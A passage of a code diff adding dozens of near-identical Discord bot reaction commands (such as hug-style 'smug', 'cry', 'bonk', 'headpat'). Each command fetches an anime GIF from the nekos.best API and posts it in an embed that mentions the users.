+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="smug")
+    async def _smug(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} smugs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} smugs!"
+
+        url = f"https://nekos.best/api/v2/smug"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="blush")
+    async def _blush(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} blushs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} blushs!"
+
+        url = f"https://nekos.best/api/v2/blush"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="cry")
+    async def _cry(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} crys {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} crys!"
+
+        url = f"https://nekos.best/api/v2/cry"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="pout")
+    async def _pout(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} pouts {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} pouts!"
+
+        url = f"https://nekos.best/api/v2/pout"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="shrug")
+    async def _shrug(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} shrugs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} shrugs!"
+
+        url = f"https://nekos.best/api/v2/shrug"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="dance")
+    async def _dance(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} dances {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} dances!"
+
+        url = f"https://nekos.best/api/v2/dance"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="wave")
+    async def _wave(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} waves {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} waves!"
+
+        url = f"https://nekos.best/api/v2/wave"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="highfive")
+    async def _highfive(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} highfives {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} highfives!"
+
+        url = f"https://nekos.best/api/v2/highfive"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="handhold")
+    async def _handhold(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} handholds {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} handholds!"
+
+        url = f"https://nekos.best/api/v2/handhold"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="nom")
+    async def _nom(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} noms {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} noms!"
+
+        url = f"https://nekos.best/api/v2/nom"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="baka")
+    async def _baka(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} bakas {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} bakas!"
+
+        url = f"https://nekos.best/api/v2/baka"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="kill")
+    async def _kill(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} kills {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} kills!"
+
+        url = f"https://nekos.best/api/v2/kill"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="lick")
+    async def _lick(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} licks {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} licks!"
+
+        url = f"https://nekos.best/api/v2/lick"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="yeet")
+    async def _yeet(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} yeets {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} yeets!"
+
+        url = f"https://nekos.best/api/v2/yeet"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="bonk")
+    async def _bonk(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} bonks {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} bonks!"
+
+        url = f"https://nekos.best/api/v2/bonk"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="headpat")
+    async def _headpat(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} headpats {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} headpats!"
+
+        url = f"https://nekos.best/api/v2/headpat"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="tail")
+    async def _tail(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} tails {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} tails!"
+
+        url = f"https://nekos.best/api/v2/tail"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="awoo")
+    async def _awoo(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} awoos {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} awoos!"
+
+        url = f"https://nekos.best/api/v2/awoo"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="feed")
+    async def _feed(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} feeds {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} feeds!"
+
+        url = f"https://nekos.best/api/v2/feed"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="confused")
+    async def _confused(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} confuseds {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} confuseds!"
+
+        url = f"https://nekos.best/api/v2/confused"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="wtf")
+    async def _wtf(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} wtfs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} wtfs!"
+
+        url = f"https://nekos.best/api/v2/wtf"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="sleep")
+    async def _sleep(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} sleeps {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} sleeps!"
+
+        url = f"https://nekos.best/api/v2/sleep"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="run")
+    async def _run(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} runs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} runs!"
+
+        url = f"https://nekos.best/api/v2/run"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="hide")
+    async def _hide(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} hides {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} hides!"
+
+        url = f"https://nekos.best/api/v2/hide"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="laugh")
+    async def _laugh(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} laughs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} laughs!"
+
+        url = f"https://nekos.best/api/v2/laugh"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="greet")
+    async def _greet(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} greets {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} greets!"
+
+        url = f"https://nekos.best/api/v2/greet"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="bye")
+    async def _bye(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} byes {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} byes!"
+
+        url = f"https://nekos.best/api/v2/bye"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="glomp")
+    async def _glomp(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} glomps {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} glomps!"
+
+        url = f"https://nekos.best/api/v2/glomp"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="cheer")
+    async def _cheer(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} cheers {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} cheers!"
+
+        url = f"https://nekos.best/api/v2/cheer"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="pounce")
+    async def _pounce(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} pounces {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} pounces!"
+
+        url = f"https://nekos.best/api/v2/pounce"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="purr")
+    async def _purr(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} purrs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} purrs!"
+
+        url = f"https://nekos.best/api/v2/purr"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="wag")
+    async def _wag(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} wags {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} wags!"
+
+        url = f"https://nekos.best/api/v2/wag"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="sip")
+    async def _sip(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} sips {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} sips!"
+
+        url = f"https://nekos.best/api/v2/sip"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="facepalm")
+    async def _facepalm(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} facepalms {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} facepalms!"
+
+        url = f"https://nekos.best/api/v2/facepalm"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="sigh")
+    async def _sigh(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} sighs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} sighs!"
+
+        url = f"https://nekos.best/api/v2/sigh"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="shy")
+    async def _shy(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} shys {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} shys!"
+
+        url = f"https://nekos.best/api/v2/shy"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="panic")
+    async def _panic(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} panics {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} panics!"
+
+        url = f"https://nekos.best/api/v2/panic"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="flex")
+    async def _flex(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} flexs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} flexs!"
+
+        url = f"https://nekos.best/api/v2/flex"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="sweat")
+    async def _sweat(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} sweats {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} sweats!"
+
+        url = f"https://nekos.best/api/v2/sweat"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="think")
+    async def _think(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} thinks {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} thinks!"
+
+        url = f"https://nekos.best/api/v2/think"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="drool")
+    async def _drool(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} drools {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} drools!"
+
+        url = f"https://nekos.best/api/v2/drool"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="thumbsup")
+    async def _thumbsup(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} thumbsups {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} thumbsups!"
+
+        url = f"https://nekos.best/api/v2/thumbsup"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="nod")
+    async def _nod(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} nods {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} nods!"
+
+        url = f"https://nekos.best/api/v2/nod"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="nope")
+    async def _nope(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} nopes {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} nopes!"
+
+        url = f"https://nekos.best/api/v2/nope"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="triggered")
+    async def _triggered(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} triggereds {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} triggereds!"
+
+        url = f"https://nekos.best/api/v2/triggered"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="scared")
+    async def _scared(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} scareds {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} scareds!"
+
+        url = f"https://nekos.best/api/v2/scared"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="bored")
+    async def _bored(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} boreds {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} boreds!"
+
+        url = f"https://nekos.best/api/v2/bored"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="comfy")
+    async def _comfy(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} comfys {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} comfys!"
+
+        url = f"https://nekos.best/api/v2/comfy"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
